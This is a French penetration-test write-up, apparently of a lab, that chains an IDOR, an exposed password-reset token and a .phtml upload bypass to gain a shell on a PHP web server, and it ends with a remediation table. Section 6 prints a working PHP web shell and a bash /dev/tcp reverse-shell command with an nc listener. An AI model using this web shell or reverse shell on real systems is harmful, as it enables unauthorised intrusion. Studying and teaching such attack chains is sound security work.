# Write-Up — Chaining Web Vulnerabilities to Full Server Compromise

> **Type :** Web Application Penetration Test
> **Cible :** `10.129.144.143` / `10.129.130.69`
> **Outils :** Nmap, Gobuster, curl, Burp Suite, Netcat
> **Résultat final :** Reverse shell sur le serveur web via une chaîne IDOR → Password Reset cassé → Bypass d'upload → RCE

---

## 1. Introduction

L'application cible est une **application web PHP/MySQL** exposant plusieurs services. L'objectif du test était d'évaluer la posture de sécurité de l'application et, le cas échéant, de démontrer un chemin d'exploitation complet jusqu'à la compromission du serveur.

L'exercice illustre un point essentiel en pentest : **aucune vulnérabilité prise isolément ne permettait la compromission totale**. C'est l'enchaînement de plusieurs faiblesses de gravité moyenne à critique qui a mené au RCE.

---

## 2. Reconnaissance

### 2.1 Scan des ports — Nmap

```bash
nmap -sC -sV -p- 10.129.144.143
```

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | SSH | Accès distant standard |
| 80/tcp | HTTP | Application web principale |
| 3306/tcp | MySQL | Base de données exposée |
| 8080/tcp | Apache (HTTP) | Service secondaire |

### 2.2 Empreinte de l'application

```bash
curl -I http://10.129.144.143
```

Les headers révèlent la stack technologique (Apache + PHP). On note les cookies de session `PHPSESSID`, ce qui confirme une gestion de session classique côté serveur.

### 2.3 Énumération de répertoires — Gobuster

```bash
gobuster dir -u http://10.129.144.143 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php
```

Endpoints intéressants découverts :

- `/login.php`
- `/register.php`
- `/profile.php`
- `/reset.php` *(page de reset de mot de passe)*
- `/admin/` *(panel administrateur)*
- `/uploads/` *(répertoire d'upload)*
- `/api/` *(API REST)*

### 2.4 Création d'un compte de test

L'inscription est ouverte. On crée un compte utilisateur pour explorer la zone authentifiée et récupérer un `PHPSESSID` valide.

### 2.5 Exploration de l'API

```bash
curl http://10.129.144.143/api/
```

L'endpoint `/api/` expose la liste des routes disponibles (`/api/user`, `/api/users`, etc.) — c'est une **divulgation d'informations** qui simplifie énormément l'énumération.

---

## 3. IDOR — Insecure Direct Object Reference

### 3.1 Détection

Une fois connecté, la page profil affiche les infos via :

```
http://10.129.144.143/profile.php?id=6
```

Le paramètre `id` est directement interpolé sans vérification d'autorisation. En modifiant la valeur, on accède aux profils d'autres utilisateurs.

### 3.2 Énumération de tous les utilisateurs

Via la page profil :

```bash
curl -s -b "PHPSESSID=gs5ngd6duukc09agpdnj1o9tt2" \
  "http://10.129.144.143/profile.php?id=1" | grep "fw-semibold"
```

Via l'API (encore plus propre, aucune mise en forme HTML à parser) :

```bash
curl -s "http://10.129.144.143/api/user?id=1"
```

En itérant sur `id=1..N`, on récupère :

- Nom, prénom
- Adresse e-mail
- Rôle (`user` / `admin`)
- Username

L'utilisateur **`id=1`** est l'administrateur. On note précieusement son **adresse e-mail** — elle sera la clé du prochain pivot.

> **Sévérité : Élevée.** L'IDOR seul ne donne pas d'accès, mais il fournit le matériel pour cibler l'administrateur.

---

## 4. Weak Password Reset

### 4.1 Comprendre le flux de reset

Sur `/reset.php`, on saisit une adresse e-mail. Normalement, un token aléatoire devrait être envoyé **uniquement par e-mail**.

Ici, en interceptant la requête avec Burp (ou en lisant simplement le HTML retourné), on constate que le **token de reset est renvoyé directement dans la réponse HTTP** au moment de la soumission.

### 4.2 Exploitation

1. On soumet le formulaire de reset avec l'e-mail de l'admin récupéré via l'IDOR.
2. La réponse contient le token (ou une URL contenant le token) du type :

   ```
   http://10.129.144.143/reset.php?token=abc123...
   ```

3. On visite cette URL et on définit un nouveau mot de passe pour le compte admin.
4. Si le token était court ou prévisible (timestamp, séquence), un brute force serait possible. Ici, l'exposition directe rend même le brute force inutile.

### 4.3 Connexion en tant qu'administrateur

```
Username : admin
Password : <nouveau_mot_de_passe>
```

> **Sévérité : Critique.** Un token de reset ne doit JAMAIS apparaître dans la réponse HTTP au navigateur.

---

## 5. Accès au panel admin & Upload de fichier

### 5.1 Exploration du dashboard

Le panel `/admin/` expose plusieurs fonctionnalités, dont une **fonction d'upload de documents**.

### 5.2 Restriction côté client

Le formulaire d'upload utilise un `accept=".pdf,.doc,.docx"` et un check JavaScript sur l'extension. Trivial à bypasser :

- Soit on désactive JavaScript.
- Soit on intercepte avec Burp et on modifie l'extension après le contrôle JS.

### 5.3 Restriction côté serveur — Blocklist incomplète

Côté serveur, le filtre repose sur une **blocklist d'extensions** (`.php`, `.php3`, `.php5`, `.phar`, etc.). Le filtre est incomplet : il **oublie `.phtml`**, qui est pourtant exécuté comme du PHP par Apache dans la configuration par défaut.

> **Leçon clé :** Toujours utiliser une **allowlist**, jamais une blocklist. Et valider le contenu (MIME, magic bytes), pas seulement l'extension.

---

## 6. Remote Code Execution

### 6.1 Préparation du web shell

Fichier `shell.phtml` :

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### 6.2 Upload et exécution

On upload le fichier via le panel admin. Il atterrit dans `/uploads/documents/shell.phtml`.

Exécution de commandes :

```bash
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=whoami"
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=hostname"
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=id"
```

On obtient l'exécution de commandes sous le contexte du user Apache (`www-data` typiquement).

### 6.3 Reverse Shell

**Sur la machine attaquante** — on ouvre un listener :

```bash
nc -lvnp 4444
```

**Sur la cible** — via le web shell, on déclenche un reverse shell bash :

```bash
curl "http://10.129.130.69/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/CONNECTION_IP/4444+0>%261'"
```

À ce stade : **shell interactif sur le serveur**. La compromission est totale (du moins au niveau du user Apache — une phase de post-exploitation/PrivEsc viendrait ensuite).

> **Sévérité : Critique.** RCE non authentifié sur le serveur web.

---

## 7. Chaîne d'attaque complète

```
[ Énumération ]
       │
       ▼
[ IDOR sur /profile.php?id= et /api/user?id= ]
       │  → Récupération e-mail admin
       ▼
[ Weak Password Reset ]
       │  → Token exposé dans la réponse HTTP
       │  → Reset du mot de passe admin
       ▼
[ Authentification admin ]
       │
       ▼
[ Upload arbitraire — blocklist incomplète ]
       │  → Bypass via .phtml
       ▼
[ Remote Code Execution ]
       │
       ▼
[ Reverse Shell — Compromission du serveur ]
```

**Point essentiel pour le rapport :** Aucune vulnérabilité ne permet à elle seule la compromission totale.

- L'IDOR fuite des infos, mais ne donne pas d'accès.
- Le password reset est exploitable, mais inutile sans l'e-mail admin.
- L'upload bypass nécessite des credentials admin.

C'est **l'enchaînement** qui transforme trois vulnérabilités gérables en compromission critique.

---

## 8. Synthèse des remédiations

| # | Vulnérabilité | Sévérité | Remédiation |
|---|---------------|----------|-------------|
| 1 | IDOR sur `/profile.php` et `/api/user` | **Élevée** | Vérifier l'autorisation côté serveur sur chaque requête. Confirmer que l'utilisateur authentifié a le droit d'accéder à la ressource demandée. Implémenter un contrôle d'accès basé sur le rôle (RBAC) et/ou sur la propriété de la ressource. |
| 2 | Token de reset exposé dans la réponse HTTP | **Critique** | Envoyer les tokens **uniquement par e-mail**. La page web ne doit afficher qu'un message générique du type *« Si l'adresse existe, un e-mail a été envoyé »*. Utiliser des tokens cryptographiquement aléatoires de **32 caractères minimum**, avec une **durée de vie courte** (15–30 min) et **usage unique**. |
| 3 | Blocklist d'extensions incomplète | **Critique** | Utiliser une **allowlist** (`.pdf`, `.docx`, `.png`, etc.). Valider le **contenu réel** du fichier (magic bytes / MIME). Stocker les fichiers uploadés **hors de la racine web** ou désactiver l'exécution PHP dans le dossier `/uploads` (`php_flag engine off` ou config nginx équivalente). Renommer les fichiers à l'upload pour éviter les conflits. |
| 4 | Endpoint `/api/` qui liste les routes | **Moyenne** | Supprimer l'index public ou le restreindre aux administrateurs authentifiés. Ne pas exposer la structure interne des routes à un utilisateur non authentifié. |
| 5 | MySQL exposé sur le port 3306 | **Moyenne** | Restreindre l'écoute MySQL à `127.0.0.1` ou à un réseau privé. Filtrer le port 3306 au niveau du firewall. |

---

## 9. Conclusion

Ce lab illustre parfaitement le principe de **defense in depth** : chaque couche défaillante de l'application contribue à la compromission finale. Une seule de ces corrections aurait suffi à **casser la chaîne** :

- Un contrôle d'autorisation correct ⇒ pas d'IDOR ⇒ pas d'e-mail admin.
- Un token de reset envoyé par e-mail ⇒ pas de prise de contrôle du compte admin.
- Une allowlist d'upload ⇒ pas de RCE.

C'est le message clé à transmettre dans le rapport client : **la sécurité ne se résume pas à corriger les vulnérabilités critiques isolées**. Une accumulation de vulnérabilités jugées « mineures » peut produire un impact « critique ».
